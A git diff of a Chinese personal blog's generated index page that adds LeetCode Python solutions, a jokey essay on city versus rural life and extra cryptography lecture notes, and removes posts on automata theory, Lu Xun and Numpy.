+              <time title="创建时间：2024-04-15 16:09:50 / 修改时间：16:54:03" itemprop="dateCreated datePublished" datetime="2024-04-15T16:09:50+08:00">2024-04-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%BA%E6%96%87%E5%85%B3%E6%80%80/" itemprop="url" rel="index"><span itemprop="name">人文关怀</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>265</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>“逃”之一字，让许多人目之所及便心有戚戚，心觉自己所处竟落得这样的凄惨！事实上，问题应当出在社会环境之中，并不是单纯你决定今晚吃什么。城市与乡村均有其局限性，好似两个嗷嗷待侍寝的丑逼，一位一个月没洗澡，一位细如萝卜丁，just
+choose。两害相权取其轻，让我们进入萝卜丁的世界扒。
+身处大城市，压力大属于是公认的臭蛋了。精神压力上（高贵的分类语句），通勤时间长，工作时间长，拉屎时间也很长。（才没有带薪xx呢！口亨！）不知名x杨giegie透露，硕士毕业工作一年，最bk的就是自己的时间太少了。（虽然说他是一个有双休的凡尔赛天后）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E4%BB%8E%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%E5%BC%80%E5%A7%8B%E7%9A%84%E5%8A%9B%E6%89%A3%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.webp">
+      <meta itemprop="name" content="Arawn">
+      <meta itemprop="description" content="美好的一天从丢大包开始">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="今天你丢大包了吗">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/%E4%BB%8E%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%E5%BC%80%E5%A7%8B%E7%9A%84%E5%8A%9B%E6%89%A3%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/" class="post-title-link" itemprop="url">从两数之和开始的力扣通关之路</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-12 13:54:35" itemprop="dateCreated datePublished" datetime="2024-04-12T13:54:35+08:00">2024-04-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-16 16:05:44" itemprop="dateModified" datetime="2024-04-16T16:05:44+08:00">2024-04-16</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="两数之和">1. 两数之和</h1>
+<pre class="line-numbers language-none"><code class="language-none">class Solution:
+    def twoSum(self, nums: List[int], target: int) -&gt; List[int]:
+        hash_table &#x3D; &#123;&#125;
+        for i in range(len(nums)):
+        # for i,num in enumerate(nums):
+            diff &#x3D; target - nums[i]
+            if diff in hash_table:
+                return [hash_table[diff],i]
+            else:
+                hash_table[nums[i]] &#x3D; i
+        return []<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="盛水最多的容器">11. 盛水最多的容器</h1>
+<pre class="line-numbers language-none"><code class="language-none">class Solution:
+    def maxArea(self, height: List[int]) -&gt; int:
+        max_area &#x3D; 0
+        left &#x3D; 0
+        right &#x3D; len(height) - 1
+        while left &lt; right:
+            current_area &#x3D; min(height[left], height[right]) * (right - left)
+            max_area &#x3D; max(max_area,current_area)
+            if height[left] &lt; height[right]:
+                left +&#x3D; 1
+            else:
+                right -&#x3D; 1
+        return max_area<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最大肯定宽度得大，从两边开始往中间合拢。（直观想法）想想为什么从头往后拓宽不行，典型错例比如[1,2,1]，初始化left=0,right=1，1
+&lt;
+2，left也到2，相同然后left再+1到1，没有遍历出1和1相差2这种情况。所以两头才是所有的情况而从头会有遗漏。两边一边一个指针，谁小谁挪，每次记录一下最大面积。</p>
+<p>错误代码be like: <pre class="line-numbers language-none"><code class="language-none">class Solution:
+    def maxArea(self, height: List[int]) -&gt; int:
+        max_area &#x3D; 0
+        left &#x3D; 0
+        right &#x3D; 1
+        while left &lt; len(height) and right &lt; len(height):
+            current_area &#x3D; min(height[left], height[right]) * abs(right - left)
+            max_area &#x3D; max(max_area,current_area)
+            if height[left] &lt;&#x3D; height[right]:
+                left +&#x3D; 1
+            else:
+                right +&#x3D; 1
+        return max_area
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<h1 id="三数之和">15. 三数之和</h1>
+<pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="字母异位词分组">49. 字母异位词分组</h1>
+<pre class="line-numbers language-none"><code class="language-none">class Solution:
+    def groupAnagrams(self, strs: List[str]) -&gt; List[List[str]]:
+        anagrams &#x3D; &#123;&#125;
+        for s in strs:
+            sorted_s &#x3D; &#39;,&#39;.join(sorted(s))
+            if sorted_s in anagrams:
+                anagrams[sorted_s].append(s)
+            else:
+                anagrams[sorted_s] &#x3D; [s]
+        return list(anagrams.values())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="最长连续序列">128. 最长连续序列</h1>
+<h2 id="思路一">思路一</h2>
+<pre class="line-numbers language-none"><code class="language-none">class Solution:
+    def longestConsecutive(self, nums: List[int]) -&gt; int:
+        if not nums:
+            return 0
+        consecutive_map &#x3D; &#123;&#125;
+        max_length &#x3D; 0
+        sorted_nums &#x3D; sorted(nums)
+        for n in nums:
+            if n in consecutive_map:
+                continue
+            left_length &#x3D; consecutive_map.get(n - 1, 0)
+            right_length &#x3D; consecutive_map.get(n + 1, 0)
+            current_length &#x3D; left_length + 1 + right_length
+            consecutive_map[n] &#x3D; current_length
+            max_length &#x3D; max(max_length,current_length)
+            consecutive_map[n - left_length] &#x3D; current_length
+            consecutive_map[n + right_length] &#x3D; current_length
+        return max_length            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>1，最大长度是1，左看看有看看，2，左边有1，最大长度是2，更新一下1的节点，以此类推。</p>
+<h2 id="思路二官方题解">思路二（官方题解</h2>
+<pre class="line-numbers language-none"><code class="language-none">class Solution:
+    def longestConsecutive(self, nums: List[int]) -&gt; int:
+        longest_streak &#x3D; 0
+        num_set &#x3D; set(nums)
+
+        for num in num_set:
+            if num - 1 not in num_set:
+                current_num &#x3D; num
+                current_streak &#x3D; 1
+
+                while current_num + 1 in num_set:
+                    current_num +&#x3D; 1
+                    current_streak +&#x3D; 1
+
+                longest_streak &#x3D; max(longest_streak, current_streak)
+
+        return longest_streak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将List转换为Set，Set与List类似，但不存储相同的元素，且查找速度要更快一些。先找到连续序列的开头，然后再用循环往下找最长序列。</p>
+<h1 id="移动零">283. 移动零</h1>
+<pre class="line-numbers language-none"><code class="language-none">class Solution:
+    def moveZeroes(self, nums: List[int]) -&gt; None:
+        &quot;&quot;&quot;
+        Do not return anything, modify nums in-place instead.
+        &quot;&quot;&quot;
+        left &#x3D;  0 # left用来指示0的位置
+        right &#x3D; 0 # right用来遍历数组
+        while right &lt; len(nums):
+            if nums[right] !&#x3D; 0:
+                nums[left],nums[right] &#x3D; nums[right],nums[left]
+                left +&#x3D; 1
+            right +&#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>1，0，2，最开始left,right都指1，1不是0，1和自己换一下，然后left和right都+1，都指0，0等于0不执行if语句，只有right继续遍历+1，left指向0，标识0的位置。right指向2，执行if语句，将0和2换位，跳出while循环结束。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E7%A9%B6%E6%9E%81%E6%97%A0%E6%95%8C%E5%AF%86%E7%A0%81%E5%AD%A6%E5%89%8D%E6%B2%BF%E8%AE%B2%E5%BA%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -229,7 +1012,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-29 13:53:56" itemprop="dateModified" datetime="2024-03-29T13:53:56+08:00">2024-03-29</time>
+                <time title="修改时间：2024-04-19 13:36:50" itemprop="dateModified" datetime="2024-04-19T13:36:50+08:00">2024-04-19</time>
               </span>
 
           <br>
@@ -238,7 +1021,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
+              <span>1.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -274,9 +1057,14 @@ Framework（MDF）。公司写代码会有很多安全准则，规范之类的�
 <h1 id="中国首届黑客大赛冠军----黄建文">中国首届黑客大赛冠军 --
 黄建文</h1>
 <p>现在打你诈骗电话少了，因为你没钱，现在精准诈骗时代；中国的暗网，即QQ群，在里面买卖信息，腰子，怕就怕悬赏，一对二十五岁的腰子五十万以上；疫情时，手机定位精确到五米，马路路口摄像头，制作平台监控所有人定位，实时监控，有大数据分析，红黄绿都从哪里来，到达地排行。知道你跑来跑去没难度，控制你有难度。五六个大白穿着防护服去抓你，你跑的快，旁边再来个大妈啪一拍。如果有大数据系统，可以避免外滩踩踏事件，知道现场有多少人，派多少警力；2014年成立网络安全与信息化领导小组，总书记担任组长，因为如果成立网络安全部同级没法监管公安部。是放慢信息化的脚步等等思想的时候了。边界领土谈判，经过信息泄露，对方早早就知道你的底牌在哪里，谈判直接输光光。去年全国布下十二亿传感器，看河水的污染程度，治理超标排放。但是传感器的核心芯片不是我们自己可控的，得用别人的芯片，别人就可以分析你们的污水。“没有网络安全，就没有国家安全。”移动支付为什么这么领先，是牺牲了网民的隐私换取，国外法案对此要求过于严格，老美直接就躺平了。</p>
-<h1
-id="上海海事大学--海事航运与密码学">上海海事大学--海事航运与密码学</h1>
+<h1 id="上海海事大学----海事航运与密码学">上海海事大学 --
+海事航运与密码学</h1>
 <p>主要介绍航运、物流与港口。海运与各国经济息息相关，受到网络攻击则会造成巨大经济损失。主要应用：其一，船舶身份认证。错误的身份信息会导致航线混乱。其二，船舶之间通信安全。防止海盗利用这些信息进行攻击。其三，船舶追踪和位置隐私保护。其四，无人船舶的安全操作。无人船舶的控制信息，如导航指令，速度和航向调整等，要保证传输这些指令时不被破解。其五，货物追踪和溯源。进行数字签名和使用加密技术。其六，安全货物交付和接受。</p>
+<h1 id="上海软件中心博士后----杨启文">上海软件中心博士后 -- 杨启文</h1>
+<p>数字经济中的区块链与密码学。首先是国家政策导向与支持，传统犯罪行为转为高科技，网络攻防行为愈演愈烈。针对DDos攻击，可能单点失效，全盘皆崩。区块链goodgood。生活中的区块链：国内小区为防止外来车辆进入，一家一把锁串在小区大门。特点：去中心化（不需要统一管理），可追溯性（谁没锁找谁），不可篡改性（一家一把锁，换锁就打不开了）。</p>
+<h1 id="华为自动驾驶----马老师">华为自动驾驶 -- 马老师</h1>
+<p>自动驾驶两个点：融合感知和规划控制。
+动态感知：传感器+算法，识别出目标的抽象。鱼眼相机可解决车辆剪裁问题，但超出5米物体会变形，无法辨识。静态环境认知：输入地图和传感器，输出预测与规划，汽车可以记录走过的地方。</p>
 
       
     </div>
@@ -571,700 +1359,6 @@ target="_blank" rel="noopener" href="https://blog.codingnow.com/2023/03/feedforw
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E5%BD%A2%E5%BC%8F%E5%8C%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%90%86%E8%AE%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.webp">
-      <meta itemprop="name" content="Arawn">
-      <meta itemprop="description" content="美好的一天从丢大包开始">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="今天你丢大包了吗">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%E5%BD%A2%E5%BC%8F%E5%8C%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%90%86%E8%AE%BA/" class="post-title-link" itemprop="url">形式化语言与自动机理论</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-03-12 14:57:05" itemprop="dateCreated datePublished" datetime="2024-03-12T14:57:05+08:00">2024-03-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-19 20:42:53" itemprop="dateModified" datetime="2024-03-19T20:42:53+08:00">2024-03-19</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>392</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="形式化语言">形式化语言</h1>
-<h1 id="有限状态自动机dfa">有限状态自动机DFA</h1>
-<h2 id="题目">题目</h2>
-<ol type="1">
-<li>给出接受以下语言的DFA：所有以1开头，能被5整除的二进制串，如101,
-1010, 1111<br />
-首先分析题目可知，一个数除以5，其余数（十进制）只能是0，1，2，3，4五种，因此我们以0，1，2，3，4分别表示这五种状态。因为要求得能被5整除的数，0
-mod 5=0满足要求，故状态0为终结状态。<br />
-接着，考虑二进制数在其串后增添0或1时，状态的转化情况。在二进制串后添1位，即可理解为将先前的串值乘以二再加上所添的数值。那么，串尾添数后新的数值模5的余数便可以计算出来。即可以得到添0或1后的新的状态。<br />
-另外，题目要求以1开头，则以1为初始状态，进行添0添1操作，最后闭合在五个数中。</li>
-</ol>
-<div class="center">
-<table>
-<thead>
-<tr class="header">
-<th>状态</th>
-<th>添0</th>
-<th>添1</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>1</td>
-<td>2</td>
-<td>3</td>
-</tr>
-<tr class="even">
-<td>2</td>
-<td>4</td>
-<td>0</td>
-</tr>
-<tr class="odd">
-<td>3</td>
-<td>2</td>
-<td>1</td>
-</tr>
-<tr class="even">
-<td>0</td>
-<td>0</td>
-<td>1</td>
-</tr>
-<tr class="odd">
-<td>4</td>
-<td>3</td>
-<td>4</td>
-</tr>
-</tbody>
-</table>
-<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://v1.ax1x.com/2024/03/19/7yKqce.png" /></p>
-</div>
-<style>
-.center 
-{
-  width: auto;
-  display: table;
-  margin-left: auto;
-  margin-right: auto;
-}
-</style>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E6%B5%AA%E6%BC%AB%E3%80%81%E8%87%AA%E7%94%B1%E4%B8%8E%E7%94%9F%E8%B7%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.webp">
-      <meta itemprop="name" content="Arawn">
-      <meta itemprop="description" content="美好的一天从丢大包开始">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="今天你丢大包了吗">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%E6%B5%AA%E6%BC%AB%E3%80%81%E8%87%AA%E7%94%B1%E4%B8%8E%E7%94%9F%E8%B7%AF/" class="post-title-link" itemprop="url">浪漫、自由与生路</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-03-06 18:06:45 / 修改时间：22:06:25" itemprop="dateCreated datePublished" datetime="2024-03-06T18:06:45+08:00">2024-03-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BA%BA%E6%96%87%E6%83%85%E6%80%80/" itemprop="url" rel="index"><span itemprop="name">人文情怀</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>488</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>作为鲁迅唯一的爱情小说，《伤逝》在被编入彷徨之前，从未在报刊上发表。
-有一个人撒谎了怎么办？不存在第三者提供的客观视角，这个故事只存在于二者之间。爱情永远是二的叙述而不是一的叙述，找不到一个公正的法官将二者的故事进行综合。
-“伤逝”不是普通恋爱小说，乃是假借了男女的死亡来哀悼兄弟恩情的断绝的。
-鲁迅先生：</p>
-<p>我昨天才知道——但过去的事不必再说了。我不是基督徒，却幸而尚能担受得起，也不想责谁——大家都是可怜的人间。我以前的蔷薇的梦原来都是虚幻，现在所见的或者才是真的人生。我想订正我的思想，重新入新的生活。以后请不要再到后边院子里来，没有别的话。愿你安心，自重。</p>
-<p>七月十八日，作人
-把开头结尾删掉，感觉像恋人间的通信，而不是弟弟写给哥哥的。 首句
-“如果我能够，我要写下自己悔恨和悲哀，为子君，为自己。”
-一个充分欧化的局势，用了条件状语，目的状语。鲁迅很提倡欧化的表达，中文的语法不精密。
-最强烈的表达 小说一方面是涓生的独白，另一方面是子君的沉默
-从古希腊开始，恋爱就一直是Lover和Beloved</p>
-<p>“这部作品讲了一个什么故事？” “一个男的……”
-“虽然鲁迅很激进，但是不会写两个男人的爱情故事。”</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E7%A9%B6%E6%9E%81%E6%97%A0%E6%95%8C%E4%B9%8BNumpy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.webp">
-      <meta itemprop="name" content="Arawn">
-      <meta itemprop="description" content="美好的一天从丢大包开始">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="今天你丢大包了吗">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%E7%A9%B6%E6%9E%81%E6%97%A0%E6%95%8C%E4%B9%8BNumpy/" class="post-title-link" itemprop="url">究极无敌之Numpy</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-02-25 13:49:45 / 修改时间：21:09:02" itemprop="dateCreated datePublished" datetime="2024-02-25T13:49:45+08:00">2024-02-25</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">深度学习</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前言">前言</h1>
-<p>总结来说，Numpy 这个库提供了以下内容：<br />
-1. N维数组，一种多维度、同质、能快速、高效使用内存的阵列<br />
-2. 提供基于矩阵的数学运算<br />
-3. 提供线性代数，傅里叶变换和随机数生成<br />
-其中数组为其核心功能</p>
-<p>第一次碰到numpy，还是在做线代课的大作业。用程序来模拟实现矩阵的运算，在网上搜索一番，最终选择了numpy和cv2库。代码如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">import cv2 # openCV进行图像处理
-import numpy as np # numpy进行数值计算
-
-mat1 &#x3D; np.array([
-    [  0, 50,  100 ],
-    [  100, 50,  0 ],
-    [  150, 200,  255 ]], dtype &#x3D; np.float32)
-resized &#x3D; np.kron(mat1, np.ones((100, 100)))  # 将矩阵放大100倍便于观看
-resized &#x3D; resized.astype(np.uint8)
-# 将图像数据的像素值范围从其他类型（如浮点数）映射到在图像处理中常见的无符号8位整数范围
-cv2.imshow(&#39;3x3 Matrix1&#39;, resized)
-cv2.waitKey()
-result &#x3D; np.linalg.inv(mat1)
-print(result)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="函数">函数</h1>
-<h2 id="matplotlib">Matplotlib</h2>
-<h3 id="eg1-基本使用">Eg1 基本使用</h3>
-<pre class="line-numbers language-none"><code class="language-none">import numpy as np 
-from matplotlib import pyplot as plt 
- 
-x &#x3D; np.arange(1,11) 
-y &#x3D;  2  * x +  5 
-plt.title(&quot;Matplotlib demo&quot;) 
-plt.xlabel(&quot;x axis caption&quot;) 
-plt.ylabel(&quot;y axis caption&quot;) 
-plt.plot(x,y) 
-plt.show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
